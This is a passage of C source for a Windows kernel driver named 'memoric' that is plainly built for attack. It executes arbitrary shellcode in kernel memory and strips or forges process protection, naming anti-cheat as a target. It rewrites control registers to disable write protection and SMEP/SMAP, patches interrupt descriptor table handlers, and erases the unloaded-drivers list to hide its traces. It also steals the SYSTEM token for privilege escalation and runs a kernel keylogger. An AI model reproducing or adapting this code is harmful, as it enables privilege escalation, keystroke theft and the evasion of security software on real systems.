        DbgPrint("[memoric] KernelExec: Executing %lu bytes at %p\n", scSize, pool);

        /* Execute */
        __try {
            retVal = ((KERNEL_SHELLCODE_FN)pool)();
            RtlZeroMemory(resp, sizeof(MEMORIC_KERNEL_EXEC_RESPONSE));
            resp->Success = 1;
            resp->AllocatedAddress = (ULONG64)(ULONG_PTR)pool;
            resp->ReturnValue = retVal;
            DbgPrint("[memoric] KernelExec: Returned 0x%llX\n", retVal);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            RtlZeroMemory(resp, sizeof(MEMORIC_KERNEL_EXEC_RESPONSE));
            resp->AllocatedAddress = (ULONG64)(ULONG_PTR)pool;
            DbgPrint("[memoric] KernelExec: Exception during execution\n");
        }

        /* Free after execution (one-shot) */
        ExFreePoolWithTag(pool, MEMORIC_POOL_TAG);
        break;
    }

    case MEMORIC_EXEC_ALLOC: {
        PVOID pool;

        if (scSize == 0 || scSize > 64 * 1024)
            break;

        pool = ExAllocatePoolWithTag(NonPagedPoolExecute, scSize, MEMORIC_POOL_TAG);
        if (!pool)
            break;

        /* Copy shellcode if provided */
        if (inputLength >= sizeof(MEMORIC_KERNEL_EXEC_REQUEST) + scSize) {
            PUCHAR shellcodeData = (PUCHAR)systemBuffer + sizeof(MEMORIC_KERNEL_EXEC_REQUEST);
            RtlCopyMemory(pool, shellcodeData, scSize);
        }

        /* Track allocation */
        if (g_KernelAllocCount < 16) {
            g_KernelAllocations[g_KernelAllocCount] = pool;
            g_KernelAllocSizes[g_KernelAllocCount] = scSize;
            g_KernelAllocCount++;
        }

        RtlZeroMemory(resp, sizeof(MEMORIC_KERNEL_EXEC_RESPONSE));
        resp->Success = 1;
        resp->AllocatedAddress = (ULONG64)(ULONG_PTR)pool;
        DbgPrint("[memoric] KernelExec: Allocated %lu bytes at %p\n", scSize, pool);
        break;
    }

    case MEMORIC_EXEC_FREE: {
        ULONG i;
        RtlZeroMemory(resp, sizeof(MEMORIC_KERNEL_EXEC_RESPONSE));

        for (i = 0; i < g_KernelAllocCount; i++) {
            if ((ULONG64)(ULONG_PTR)g_KernelAllocations[i] == allocAddr) {
                ExFreePoolWithTag(g_KernelAllocations[i], MEMORIC_POOL_TAG);
                /* Shift array */
                g_KernelAllocations[i] = g_KernelAllocations[g_KernelAllocCount - 1];
                g_KernelAllocSizes[i] = g_KernelAllocSizes[g_KernelAllocCount - 1];
                g_KernelAllocCount--;
                resp->Success = 1;
                DbgPrint("[memoric] KernelExec: Freed 0x%llX\n", allocAddr);
                break;
            }
        }
        break;
    }

    default:
        RtlZeroMemory(resp, sizeof(MEMORIC_KERNEL_EXEC_RESPONSE));
        break;
    }

    *bytesReturned = sizeof(MEMORIC_KERNEL_EXEC_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * PPL Bypass — Strip or set PS_PROTECTION byte in EPROCESS.
 *
 * Protection byte structure (PS_PROTECTION):
 *   Bits 0-2: Type   (0=None, 1=Light, 2=Full)
 *   Bits 3:   Audit  
 *   Bits 4-7: Signer (0=None, 1=Authenticode, 2=CodeGen, 3=Antimalware,
 *                      4=Lsa, 5=Windows, 6=WinTcb, 7=WinSystem)
 *
 * Full PPL WinTcb = 0x72 (Signer=WinTcb(6)<<4 | Type=Full(2))
 * Light PPL WinTcb = 0x61 (Signer=WinTcb(6)<<4 | Type=Light(1))
 * ================================================================ */

static NTSTATUS HandlePplBypass(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_PPL_BYPASS_REQUEST reqCopy;
    PMEMORIC_PPL_BYPASS_RESPONSE resp;
    PEPROCESS process = NULL;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_PPL_BYPASS_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_PPL_BYPASS_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_PPL_BYPASS_REQUEST));
    resp = (PMEMORIC_PPL_BYPASS_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_PPL_BYPASS_RESPONSE));
    resp->ProcessId = reqCopy.ProcessId;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] PPL: PID %lu not found\n", reqCopy.ProcessId);
        *bytesReturned = sizeof(MEMORIC_PPL_BYPASS_RESPONSE);
        return STATUS_SUCCESS;
    }

    resp->EprocessAddr = (ULONG64)(ULONG_PTR)process;

    if (g_Offsets.Resolved && g_Offsets.Protection != 0) {
        PUCHAR protByte = (PUCHAR)process + g_Offsets.Protection;

        switch (reqCopy.Action) {
        case MEMORIC_PPL_STRIP:
            resp->OldProtection = *protByte;
            *protByte = 0;  /* Strip all protection */
            resp->NewProtection = 0;
            resp->Success = 1;
            DbgPrint("[memoric] PPL: PID %lu protection stripped (0x%02X -> 0x00)\n",
                     reqCopy.ProcessId, resp->OldProtection);
            break;

        case MEMORIC_PPL_SET:
            resp->OldProtection = *protByte;
            *protByte = reqCopy.ProtectionLevel;
            resp->NewProtection = reqCopy.ProtectionLevel;
            resp->Success = 1;
            DbgPrint("[memoric] PPL: PID %lu protection set (0x%02X -> 0x%02X)\n",
                     reqCopy.ProcessId, resp->OldProtection, resp->NewProtection);
            break;

        case MEMORIC_PPL_QUERY:
            resp->OldProtection = *protByte;
            resp->NewProtection = *protByte;
            resp->Success = 1;
            break;

        default:
            break;
        }
    } else {
        DbgPrint("[memoric] PPL: EPROCESS.Protection offset not resolved\n");
    }

    ObDereferenceObject(process);
    *bytesReturned = sizeof(MEMORIC_PPL_BYPASS_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Control Register R/W — Read/write CR0, CR3, CR4
 *
 * Key bits:
 *   CR0.WP (bit 16) — Write Protect (disable for kernel write-anywhere)
 *   CR4.SMEP (bit 20) — Supervisor Mode Execution Prevention
 *   CR4.SMAP (bit 21) — Supervisor Mode Access Prevention
 *
 * WARNING: With Hyper-V active, CR writes may cause #GP.
 * Use with caution.
 * ================================================================ */

static NTSTATUS HandleCrRW(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_CR_REQUEST reqCopy;
    PMEMORIC_CR_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_CR_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_CR_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_CR_REQUEST));
    resp = (PMEMORIC_CR_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_CR_RESPONSE));
    resp->CrIndex = reqCopy.CrIndex;

    switch (reqCopy.Action) {
    case MEMORIC_CR_READ:
        __try {
            switch (reqCopy.CrIndex) {
            case 0: resp->Value = __readcr0(); break;
            case 3: resp->Value = __readcr3(); break;
            case 4: resp->Value = __readcr4(); break;
            default:
                DbgPrint("[memoric] CR: Invalid index %lu\n", reqCopy.CrIndex);
                *bytesReturned = sizeof(MEMORIC_CR_RESPONSE);
                return STATUS_SUCCESS;
            }
            resp->Success = 1;
            DbgPrint("[memoric] CR%lu = 0x%llX\n", reqCopy.CrIndex, resp->Value);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] CR: Read CR%lu failed\n", reqCopy.CrIndex);
        }
        break;

    case MEMORIC_CR_WRITE: {
        KIRQL oldIrql;
        __try {
            switch (reqCopy.CrIndex) {
            case 0:
                resp->OldValue = __readcr0();
                KeRaiseIrql(HIGH_LEVEL, &oldIrql);
                __writecr0(reqCopy.Value);
                KeLowerIrql(oldIrql);
                resp->Value = __readcr0();
                resp->Success = 1;
                break;
            case 3:
                resp->OldValue = __readcr3();
                KeRaiseIrql(HIGH_LEVEL, &oldIrql);
                __writecr3(reqCopy.Value);
                KeLowerIrql(oldIrql);
                resp->Value = __readcr3();
                resp->Success = 1;
                break;
            case 4:
                resp->OldValue = __readcr4();
                KeRaiseIrql(HIGH_LEVEL, &oldIrql);
                __writecr4(reqCopy.Value);
                KeLowerIrql(oldIrql);
                resp->Value = __readcr4();
                resp->Success = 1;
                break;
            default:
                break;
            }
            DbgPrint("[memoric] CR%lu: 0x%llX -> 0x%llX\n",
                     reqCopy.CrIndex, resp->OldValue, resp->Value);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] CR: Write CR%lu failed\n", reqCopy.CrIndex);
        }
        break;
    }

    default:
        break;
    }

    *bytesReturned = sizeof(MEMORIC_CR_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * IDT R/W — Read/modify Interrupt Descriptor Table entries.
 *
 * KIDTENTRY64 on x64 (16 bytes):
 *   Offset 0:  USHORT OffsetLow
 *   Offset 2:  USHORT Selector  
 *   Offset 4:  UCHAR  IstIndex:3, Reserved0:5
 *   Offset 5:  UCHAR  Type:4, Reserved1:1, DPL:2, Present:1
 *   Offset 6:  USHORT OffsetMiddle
 *   Offset 8:  ULONG  OffsetHigh
 *   Offset 12: ULONG  Reserved2
 * ================================================================ */

#pragma pack(push, 1)
typedef struct _KIDTENTRY64_RAW {
    USHORT OffsetLow;
    USHORT Selector;
    UCHAR  IstIndex;    /* bits 0-2: IST, 3-7: reserved */
    UCHAR  TypeDpl;     /* bits 0-3: type, 4: reserved, 5-6: DPL, 7: present */
    USHORT OffsetMiddle;
    ULONG  OffsetHigh;
    ULONG  Reserved;
} KIDTENTRY64_RAW;
#pragma pack(pop)

static NTSTATUS HandleIdtRW(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_IDT_REQUEST reqCopy;
    PMEMORIC_IDT_RESPONSE resp;
    KIDTENTRY64_RAW *idtEntry;

    #pragma pack(push, 1)
    struct { USHORT Limit; ULONG64 Base; } idtr;
    #pragma pack(pop)

    if (inputLength < sizeof(MEMORIC_IDT_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_IDT_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_IDT_REQUEST));
    resp = (PMEMORIC_IDT_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_IDT_RESPONSE));
    resp->Vector = reqCopy.Vector;

    /* Get IDTR */
    __sidt(&idtr);
    resp->IdtBase = idtr.Base;
    resp->IdtLimit = idtr.Limit;

    if (reqCopy.Vector > 255) {
        DbgPrint("[memoric] IDT: Invalid vector %lu\n", reqCopy.Vector);
        *bytesReturned = sizeof(MEMORIC_IDT_RESPONSE);
        return STATUS_SUCCESS;
    }

    idtEntry = (KIDTENTRY64_RAW *)(idtr.Base + reqCopy.Vector * sizeof(KIDTENTRY64_RAW));

    switch (reqCopy.Action) {
    case MEMORIC_IDT_READ: {
        ULONG64 handler = (ULONG64)idtEntry->OffsetLow |
                          ((ULONG64)idtEntry->OffsetMiddle << 16) |
                          ((ULONG64)idtEntry->OffsetHigh << 32);
        resp->HandlerAddress = handler;
        resp->Segment = idtEntry->Selector;
        resp->Type = idtEntry->TypeDpl & 0x0F;
        resp->DPL = (idtEntry->TypeDpl >> 5) & 0x03;
        resp->Present = (idtEntry->TypeDpl >> 7) & 0x01;
        resp->Success = 1;
        DbgPrint("[memoric] IDT[%lu]: handler=0x%llX seg=0x%X type=%u DPL=%u\n",
                 reqCopy.Vector, handler, resp->Segment, resp->Type, resp->DPL);
        break;
    }

    case MEMORIC_IDT_WRITE: {
        ULONG64 oldHandler = (ULONG64)idtEntry->OffsetLow |
                             ((ULONG64)idtEntry->OffsetMiddle << 16) |
                             ((ULONG64)idtEntry->OffsetHigh << 32);
        resp->OldHandlerAddress = oldHandler;

        if (reqCopy.NewHandler != 0) {
            KIRQL oldIrql;
            KeRaiseIrql(HIGH_LEVEL, &oldIrql);
            _disable();

            idtEntry->OffsetLow    = (USHORT)(reqCopy.NewHandler & 0xFFFF);
            idtEntry->OffsetMiddle = (USHORT)((reqCopy.NewHandler >> 16) & 0xFFFF);
            idtEntry->OffsetHigh   = (ULONG)((reqCopy.NewHandler >> 32) & 0xFFFFFFFF);

            _enable();
            KeLowerIrql(oldIrql);

            resp->HandlerAddress = reqCopy.NewHandler;
            resp->Success = 1;
            DbgPrint("[memoric] IDT[%lu]: handler patched 0x%llX -> 0x%llX\n",
                     reqCopy.Vector, oldHandler, reqCopy.NewHandler);
        }
        break;
    }

    default:
        break;
    }

    *bytesReturned = sizeof(MEMORIC_IDT_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Unloaded Drivers Clear — Clean MmUnloadedDrivers array.
 *
 * MmUnloadedDrivers is a global PUNLOADED_DRIVERS pointer.
 * Each entry contains: UNICODE_STRING Name, PVOID StartAddress/EndAddress,
 * LARGE_INTEGER CurrentTime.
 * We find it by scanning ntoskrnl for MmLastUnloadedDriver pattern.
 * ================================================================ */

typedef struct _UNLOADED_DRIVER {
    UNICODE_STRING Name;
    PVOID StartAddress;
    PVOID EndAddress;
    LARGE_INTEGER CurrentTime;
} UNLOADED_DRIVER, *PUNLOADED_DRIVER;

static NTSTATUS HandleUnloadedDrvClear(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_UNLOADED_DRV_REQUEST reqCopy;
    PMEMORIC_UNLOADED_DRV_RESPONSE resp;
    UNICODE_STRING mmUnloadedName;
    PVOID *pMmUnloadedDrivers;
    PULONG pMmLastUnloadedDriver;
    PUNLOADED_DRIVER entries;

    if (inputLength < sizeof(MEMORIC_UNLOADED_DRV_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_UNLOADED_DRV_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_UNLOADED_DRV_REQUEST));
    resp = (PMEMORIC_UNLOADED_DRV_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_UNLOADED_DRV_RESPONSE));

    /* Find MmUnloadedDrivers via MmGetSystemRoutineAddress */
    RtlInitUnicodeString(&mmUnloadedName, L"MmUnloadedDrivers");
    pMmUnloadedDrivers = (PVOID *)MmGetSystemRoutineAddress(&mmUnloadedName);

    if (!pMmUnloadedDrivers || !*pMmUnloadedDrivers) {
        DbgPrint("[memoric] UnloadedDrv: Cannot find MmUnloadedDrivers\n");
        *bytesReturned = sizeof(MEMORIC_UNLOADED_DRV_RESPONSE);
        return STATUS_SUCCESS;
    }

    resp->MmUnloadedDriversAddr = (ULONG64)(ULONG_PTR)pMmUnloadedDrivers;
    entries = (PUNLOADED_DRIVER)*pMmUnloadedDrivers;

    /* Find MmLastUnloadedDriver */
    {
        UNICODE_STRING lastName;
        RtlInitUnicodeString(&lastName, L"MmLastUnloadedDriver");
        pMmLastUnloadedDriver = (PULONG)MmGetSystemRoutineAddress(&lastName);
    }

    switch (reqCopy.Action) {
    case MEMORIC_UNLOADED_CLEAR_ALL: {
        /* Clear all 50 entries (MI_UNLOADED_DRIVERS = 50) */
        ULONG i;
        ULONG cleared = 0;
        for (i = 0; i < 50; i++) {
            if (entries[i].Name.Buffer) {
                /* Free the name buffer and zero the entry */
                entries[i].Name.Length = 0;
                entries[i].Name.MaximumLength = 0;
                entries[i].Name.Buffer = NULL;
                entries[i].StartAddress = NULL;
                entries[i].EndAddress = NULL;
                entries[i].CurrentTime.QuadPart = 0;
                cleared++;
            }
        }
        if (pMmLastUnloadedDriver)
            *pMmLastUnloadedDriver = 0;
        resp->Success = 1;
        resp->EntriesCleared = cleared;
        resp->TotalEntries = 50;
        DbgPrint("[memoric] UnloadedDrv: Cleared %lu entries\n", cleared);
        break;
    }

    case MEMORIC_UNLOADED_CLEAR_NAME: {
        UNICODE_STRING targetName;
        ULONG i;
        ULONG cleared = 0;
        reqCopy.DriverName[63] = L'\0';
        RtlInitUnicodeString(&targetName, reqCopy.DriverName);

        for (i = 0; i < 50; i++) {
            if (entries[i].Name.Buffer &&
                RtlCompareUnicodeString(&entries[i].Name, &targetName, TRUE) == 0) {
                entries[i].Name.Length = 0;
                entries[i].Name.MaximumLength = 0;
                entries[i].Name.Buffer = NULL;
                entries[i].StartAddress = NULL;
                entries[i].EndAddress = NULL;
                entries[i].CurrentTime.QuadPart = 0;
                cleared++;
            }
        }
        resp->Success = 1;
        resp->EntriesCleared = cleared;
        resp->TotalEntries = 50;
        DbgPrint("[memoric] UnloadedDrv: Cleared %lu entries matching %wZ\n", cleared, &targetName);
        break;
    }

    case MEMORIC_UNLOADED_QUERY: {
        ULONG i;
        ULONG total = 0;
        for (i = 0; i < 50; i++) {
            if (entries[i].Name.Buffer) total++;
        }
        resp->Success = 1;
        resp->TotalEntries = total;
        break;
    }

    default:
        break;
    }

    *bytesReturned = sizeof(MEMORIC_UNLOADED_DRV_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Token Swap — Direct EPROCESS->Token pointer swap.
 * Copies the System process (PID 4) token to target process.
 * This gives NT AUTHORITY\SYSTEM privileges instantly.
 * ================================================================ */

static NTSTATUS HandleTokenSwap(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_TOKEN_STEAL_REQUEST reqCopy;
    PMEMORIC_TOKEN_STEAL_RESPONSE resp;
    PEPROCESS targetProcess = NULL;
    PEPROCESS sourceProcess = NULL;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_TOKEN_STEAL_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_TOKEN_STEAL_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_TOKEN_STEAL_REQUEST));
    resp = (PMEMORIC_TOKEN_STEAL_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_TOKEN_STEAL_RESPONSE));
    resp->TargetPid = reqCopy.TargetPid;

    if (!g_Offsets.Resolved || g_Offsets.Token == 0) {
        DbgPrint("[memoric] TokenSteal: Offsets not resolved\n");
        *bytesReturned = sizeof(MEMORIC_TOKEN_STEAL_RESPONSE);
        return STATUS_SUCCESS;
    }

    /* Lookup target */
    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.TargetPid, &targetProcess);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] TokenSteal: Target PID %lu not found\n", reqCopy.TargetPid);
        *bytesReturned = sizeof(MEMORIC_TOKEN_STEAL_RESPONSE);
        return STATUS_SUCCESS;
    }

    resp->EprocessAddr = (ULONG64)(ULONG_PTR)targetProcess;

    /* Lookup source (default: System PID 4) */
    {
        ULONG sourcePid = reqCopy.SourcePid;
        if (sourcePid == 0) sourcePid = 4;

        st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)sourcePid, &sourceProcess);
        if (!NT_SUCCESS(st)) {
            DbgPrint("[memoric] TokenSteal: Source PID %lu not found\n", sourcePid);
            ObDereferenceObject(targetProcess);
            *bytesReturned = sizeof(MEMORIC_TOKEN_STEAL_RESPONSE);
            return STATUS_SUCCESS;
        }
    }

    switch (reqCopy.Action) {
    case MEMORIC_TOKEN_STEAL:
    case MEMORIC_TOKEN_SWAP: {
        PULONG64 targetToken = (PULONG64)((PUCHAR)targetProcess + g_Offsets.Token);
        PULONG64 sourceToken = (PULONG64)((PUCHAR)sourceProcess + g_Offsets.Token);

        resp->OldToken = *targetToken;
        *targetToken = *sourceToken;
        resp->NewToken = *targetToken;
        resp->Success = 1;

        DbgPrint("[memoric] TokenSteal: PID %lu token: 0x%llX -> 0x%llX (from PID %lu)\n",
                 reqCopy.TargetPid, resp->OldToken, resp->NewToken,
                 reqCopy.SourcePid ? reqCopy.SourcePid : 4);
        break;
    }

    case MEMORIC_TOKEN_QUERY: {
        PULONG64 targetToken = (PULONG64)((PUCHAR)targetProcess + g_Offsets.Token);
        resp->OldToken = *targetToken;
        resp->NewToken = *targetToken;
        resp->Success = 1;
        break;
    }

    default:
        break;
    }

    ObDereferenceObject(sourceProcess);
    ObDereferenceObject(targetProcess);
    *bytesReturned = sizeof(MEMORIC_TOKEN_STEAL_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Process Protect — Set/strip PS_PROTECTION on any process.
 * Can add PPL to protect our process or strip PPL from anti-cheat.
 * ================================================================ */

static NTSTATUS HandleProcessProtect(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_PROCESS_PROTECT_REQUEST reqCopy;
    PMEMORIC_PROCESS_PROTECT_RESPONSE resp;
    PEPROCESS process = NULL;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_PROCESS_PROTECT_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_PROCESS_PROTECT_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_PROCESS_PROTECT_REQUEST));
    resp = (PMEMORIC_PROCESS_PROTECT_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_PROCESS_PROTECT_RESPONSE));
    resp->ProcessId = reqCopy.ProcessId;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] Protect: PID %lu not found\n", reqCopy.ProcessId);
        *bytesReturned = sizeof(MEMORIC_PROCESS_PROTECT_RESPONSE);
        return STATUS_SUCCESS;
    }

    resp->EprocessAddr = (ULONG64)(ULONG_PTR)process;

    if (g_Offsets.Resolved && g_Offsets.Protection != 0) {
        PUCHAR protByte = (PUCHAR)process + g_Offsets.Protection;

        resp->OldProtection = *protByte;
        resp->OldSignerType = (*protByte >> 4) & 0x0F;
        resp->OldSignerAudit = (*protByte >> 3) & 0x01;

        switch (reqCopy.Action) {
        case MEMORIC_PROTECT_SET: {
            /* Build protection byte: Signer(4bits)<<4 | Audit(1bit)<<3 | Type(3bits) */
            UCHAR newProt = (reqCopy.SignerType << 4) | (reqCopy.SignerAudit << 3) | (reqCopy.SignerLevel & 0x07);
            *protByte = newProt;
            resp->NewProtection = newProt;
            resp->Success = 1;
            DbgPrint("[memoric] Protect: PID %lu set 0x%02X -> 0x%02X (Signer=%u Type=%u)\n",
                     reqCopy.ProcessId, resp->OldProtection, newProt,
                     reqCopy.SignerType, reqCopy.SignerLevel);
            break;
        }

        case MEMORIC_PROTECT_STRIP:
            *protByte = 0;
            resp->NewProtection = 0;
            resp->Success = 1;
            DbgPrint("[memoric] Protect: PID %lu stripped 0x%02X -> 0x00\n",
                     reqCopy.ProcessId, resp->OldProtection);
            break;

        case MEMORIC_PROTECT_QUERY:
            resp->NewProtection = *protByte;
            resp->Success = 1;
            break;

        default:
            break;
        }
    } else {
        DbgPrint("[memoric] Protect: EPROCESS.Protection offset not resolved\n");
    }

    ObDereferenceObject(process);
    *bytesReturned = sizeof(MEMORIC_PROCESS_PROTECT_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Phase 13 Handlers
 * ================================================================ */

/* ----------------------------------------------------------------
 * Keylogger — DPC callback to poll gafAsyncKeyState
 * ---------------------------------------------------------------- */

static VOID KeyloggerDpcRoutine(
    PKDPC Dpc, PVOID Context, PVOID Arg1, PVOID Arg2)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(Context);
    UNREFERENCED_PARAMETER(Arg1);
    UNREFERENCED_PARAMETER(Arg2);

    if (!g_KeyloggerActive || !g_GafAsyncKeyState)
        return;

    __try {
        UCHAR currentState[64];
        ULONG i;

        RtlCopyMemory(currentState, g_GafAsyncKeyState, 64);

        for (i = 0; i < 256; i++) {
            ULONG byteIdx = i / 8;
            ULONG bitIdx = i % 8;
            UCHAR cur = (currentState[byteIdx] >> bitIdx) & 1;
            UCHAR prev = (g_PrevKeyState[byteIdx] >> bitIdx) & 1;

            /* Detect key press (transition from 0 to 1) */
            if (cur && !prev) {
                LONG head = InterlockedIncrement(&g_KeyBufferHead) - 1;
                g_KeyBuffer[head % 4096] = (USHORT)i;
                if (g_KeyBufferCount < 4096)
                    InterlockedIncrement(&g_KeyBufferCount);
            }
        }

        RtlCopyMemory(g_PrevKeyState, currentState, 64);

    } __except (EXCEPTION_EXECUTE_HANDLER) {
        /* Suppress - gafAsyncKeyState might have moved */
    }
}

static PVOID FindGafAsyncKeyState(void)
{
    /*
     * gafAsyncKeyState is in win32kbase.sys — 256 bits (32 bytes) of async
     * key state followed by 256 bits of recent key state = 64 bytes total.
     *
     * Strategy:
     * 1. Find win32kbase.sys base and NtUserGetAsyncKeyState export
     * 2. Scan NtUserGetAsyncKeyState code for LEA/MOV [rip+disp32] references
     * 3. Validate each candidate as a 64-byte key state buffer
     * 4. Fallback: broader pattern scan of .data section
     *
     * Reference: NtUserGetAsyncKeyState reads gafAsyncKeyState directly.
     */
    PVOID base = NULL;
    ULONG size = 0;
    PRTL_PROCESS_MODULES modules = NULL;
    ULONG bufSize = 0;
    NTSTATUS st;
    ULONG i;

    /* Find win32kbase.sys module */
    st = ZwQuerySystemInformation(11, NULL, 0, &bufSize);
    if (bufSize == 0) return NULL;
    bufSize += 4096;
    modules = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, bufSize, MEMORIC_POOL_TAG);
    if (!modules) return NULL;

    st = ZwQuerySystemInformation(11, modules, bufSize, &bufSize);
    if (NT_SUCCESS(st)) {
        for (i = 0; i < modules->NumberOfModules; i++) {
            PCHAR name = (PCHAR)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
            if (_stricmp(name, "win32kbase.sys") == 0) {
                base = modules->Modules[i].ImageBase;
                size = modules->Modules[i].ImageSize;
                break;
            }
        }
    }
    ExFreePoolWithTag(modules, MEMORIC_POOL_TAG);

    if (!base) {
        DbgPrint("[memoric] Keylogger: win32kbase.sys not found\n");
        return NULL;
    }

    __try {
        /*
         * Method 1: Find NtUserGetAsyncKeyState export and trace its code
         * for references to gafAsyncKeyState (LEA/MOV [rip+disp32]).
         */
        PIMAGE_NT_HEADERS ntHdr = RtlImageNtHeader(base);
        PVOID asyncKeyFunc = NULL;

        if (ntHdr) {
            ULONG exportDirRva = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            ULONG exportDirSize = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

            if (exportDirRva && exportDirSize) {
                PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)base + exportDirRva);
                PULONG nameRvas = (PULONG)((PUCHAR)base + exports->AddressOfNames);
                PUSHORT ordinals = (PUSHORT)((PUCHAR)base + exports->AddressOfNameOrdinals);
                PULONG funcRvas = (PULONG)((PUCHAR)base + exports->AddressOfFunctions);

                for (i = 0; i < exports->NumberOfNames; i++) {
                    PCHAR fname = (PCHAR)base + nameRvas[i];
                    if (strcmp(fname, "NtUserGetAsyncKeyState") == 0) {
                        asyncKeyFunc = (PUCHAR)base + funcRvas[ordinals[i]];
                        break;
                    }
                }
            }
        }

        if (asyncKeyFunc) {
            /* Scan NtUserGetAsyncKeyState code (first 256 bytes) for data references */
            PUCHAR code = (PUCHAR)asyncKeyFunc;
            ULONG off;

            for (off = 0; off < 240; off++) {
                PVOID target = NULL;

                /* LEA r64, [rip+disp32]: 48/4C 8D xx (ModRM & 0xC7 == 0x05) */
                if ((code[off] == 0x48 || code[off] == 0x4C) &&
                    code[off+1] == 0x8D &&
                    (code[off+2] & 0xC7) == 0x05) {
                    LONG disp = *(PLONG)(&code[off+3]);
                    target = &code[off+7] + disp;
                }
                /* MOV r64, [rip+disp32]: 48 8B 05/0D/15/etc */
                else if (code[off] == 0x48 && code[off+1] == 0x8B &&
                         (code[off+2] & 0xC7) == 0x05) {
                    LONG disp = *(PLONG)(&code[off+3]);
                    target = &code[off+7] + disp;
                }

                if (target &&
                    (ULONG_PTR)target > (ULONG_PTR)base &&
                    (ULONG_PTR)target < (ULONG_PTR)base + size - 64) {
                    /* Validate: 64-byte key state buffer, mostly zeros when idle */
                    UCHAR testBuf[64];
                    ULONG nonZero = 0;
                    ULONG j;
                    RtlCopyMemory(testBuf, target, 64);
                    for (j = 0; j < 64; j++) {
                        if (testBuf[j]) nonZero++;
                    }
                    /* At idle: very few keys pressed (0-4 bytes nonzero out of 64) */
                    if (nonZero <= 4) {
                        DbgPrint("[memoric] Keylogger: gafAsyncKeyState at %p via NtUserGetAsyncKeyState+0x%X (nonzero=%lu)\n",
                                 target, off, nonZero);
                        return target;
                    }
                }
            }

            /* Also follow CALL rel32 in NtUserGetAsyncKeyState to check callees */
            for (off = 0; off < 240; off++) {
                if (code[off] == 0xE8) {
                    LONG disp = *(PLONG)(&code[off+1]);
                    PVOID callee = &code[off+5] + disp;

                    if ((ULONG_PTR)callee >= (ULONG_PTR)base &&
                        (ULONG_PTR)callee < (ULONG_PTR)base + size - 256) {
                        PUCHAR ccode = (PUCHAR)callee;
                        ULONG coff;
                        for (coff = 0; coff < 200; coff++) {
                            PVOID ctarget = NULL;

